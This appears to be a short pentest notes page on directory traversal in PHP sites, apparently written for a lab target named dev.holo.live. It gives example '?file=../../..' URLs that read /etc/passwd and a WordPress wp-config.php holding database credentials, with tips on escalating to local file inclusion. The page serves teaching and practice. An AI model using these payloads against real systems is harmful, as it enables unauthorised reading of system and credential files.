---
description: Dot-Dot-Slash!
---

# Directory Traversal

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md" %}

## PHP

Do you have a file parameter in the URL bar?

* <mark style="color:yellow;">?file=</mark>

```
dev.holo.live/img.php?file=../../../../../../../../../../etc/passwd
```

* If this works, this can ultimately lead to LFI
* This will then allow us to include a file
* Does the site have a robots.txt?&#x20;
  * Check the contents and include the file
  * This could be a configuration page with sensitive information
* For example, wp-config.php contains the database's credentials!

```
dev.holo.live/img.php?file=../../../../../../../../../../var/www/wordpress/wp-config.php
```
